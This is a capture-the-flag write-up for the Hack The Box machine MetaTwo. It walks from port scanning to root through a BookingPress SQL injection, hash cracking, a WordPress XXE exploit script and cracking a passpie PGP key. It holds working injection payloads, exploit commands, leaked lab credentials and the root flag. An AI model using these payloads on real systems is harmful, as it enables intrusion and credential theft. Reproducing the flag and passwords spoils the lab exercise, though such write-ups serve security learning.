## Port Scan

```shell
──(kali㉿kali)-[~]
└─$ nmap -sV metapress.htb -v         
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 10:41 EST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 10:41
Scanning metapress.htb (10.10.11.186) [2 ports]
Completed Ping Scan at 10:41, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 10:41
Scanning metapress.htb (10.10.11.186) [1000 ports]
Discovered open port 22/tcp on 10.10.11.186
Discovered open port 21/tcp on 10.10.11.186
Discovered open port 80/tcp on 10.10.11.186
Completed Connect Scan at 10:41, 0.63s elapsed (1000 total ports)
Initiating Service scan at 10:41
Scanning 3 services on metapress.htb (10.10.11.186)
Completed Service scan at 10:44, 158.09s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.186.
Initiating NSE at 10:44
Completed NSE at 10:44, 1.52s elapsed
Initiating NSE at 10:44
Completed NSE at 10:44, 1.06s elapsed
Nmap scan report for metapress.htb (10.10.11.186)
Host is up (0.046s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/16%Time=637504B8%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.10 seconds
```

## Directory Enumeration

```shell
──(kali㉿kali)-[~]
└─$ gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://metapress.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/16 10:42:01 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/rss                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
/login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]
/events               (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
/0                    (Status: 301) [Size: 0] [--> http://metapress.htb/0/]
/feed                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
/atom                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/atom/]
/s                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
/a                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/c                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/wp-content           (Status: 301) [Size: 169] [--> http://metapress.htb/wp-content/]
/t                    (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]
/admin                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]
/e                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
/h                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]
/rss2                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
/About                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/ca                   (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/event                (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
/wp-includes          (Status: 301) [Size: 169] [--> http://metapress.htb/wp-includes/]
/C                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/A                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/S                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
/E                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
/about-us             (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/Events               (Status: 301) [Size: 0] [--> http://metapress.htb/Events/]

```

## Low hanging fruits

FTP is not accessible anonymously.
WP admin password is not trivial.

Looking at [[HTB Labs/MetaTwo/Enumeration]] there is an "Events".
This is also visible in the homepage by the way.

## Events page

Wappalyzer does not identify the Wordpress plugin for events.

By the way looking at the HTML a few lines like:

```html
<link rel='stylesheet' id='bookingpress_element_css-css'  href='[http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10](view-source:http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10)' media='all' />
```

A plugin for events is used, its name is "bookingpress" probably.
An exploit exists here:

https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

## Running the first Exploit

The exploit requires a nonce, which can be found later in the page searching for `bookingpress_front_get_category_services` in the HTML.

A first attempt with:

```bash
curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

reveals that the website is vulnerable!

```shell

┌──(kali㉿kali)-[~]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=b81f4b63a7&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' 

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 16 Nov 2022 15:55:21 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                                                                                                                                                                                   
```

It's clear that we can extract data from the database using this SQL injection.
Now we can extract user and password hash, then.

```shell

┌──(kali㉿kali)-[~]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=b81f4b63a7&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 16 Nov 2022 15:58:54 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"admin","bookingpress_category_id":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"manager","bookingpress_category_id":"$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                                                                                                                                                                                                                                                                
```

So the password hash for the user `admin` is `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
The password hash for the other user `manager` is `$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70` where the escape character `\` must be removed to make it valid.

## Password Crack

Let's try to crack both with hashcat!

```bash
hashcat -O -m 400 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt.gz
```

Rockyou does not contain the password for admin, unfortunately.
But it contains password for manager! The pasword is: `partylikearockstar`

We can now login using these credentials.

## Second Exploit in Wordpress

Through WPScan we notice the Wordpress version, which is `5.6.2` that is known to be vulnerable to: https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/

A (bash) script is already available in searchsploit to exploit this!

```
──(kali㉿kali)-[~/htb/labs/MetaTwo]
└─$ bash /usr/share/exploitdb/exploits/php/webapps/50304.sh metapress.htb manager partylikearockstar ../wp-config.php 10.10.14.57
```

This returns the content of the wp-config file. In particular we have:

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

## Explore the FTP

We can now access the FTP but unfortunately the space is not writable. 
The other website, `mailer` in the FTP root, has a file: `send_email.php`.
There is a password inside.

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   
```

This password can be used to log into SSH!

## Get User Flag

```shell
┌──(kali㉿kali)-[~/htb/labs/MetaTwo]
└─$ ssh jnelson@10.129.119.194
```

And the `user.txt` file containes the user flag.

## Privilege Escalation

Once we are into the machine as `jnelson` we start checking possible vulnerabilities.
A hidden directory in `/home/jnelson` rings a bell. It contains the PGP password of root and jnelson.  It's a passpie database, a password manager.

## Cracking Passpie

The PGP key is located in `/home/.passpie/.keys` and must be first cleaned up from the "public" part. Then it can be converted to a valid hash for John the Ripper.

```shell
gpg2john .keys > hash
```

Then it can be passed to John The Ripper:

```shell
john --wordlist=rockyou.txt hash
```

Notice the rockyou wordlist must be in txt format for JtR.
The password is: `blink182` 

This decripts the passpie database and the password for the root can now be extracted: `'p7qfAZt4_A1xo_0x'`.

It is now possible to `su` to user root! 

The root flag is `5939fbcf5f4b383fe037e69c940cccf5`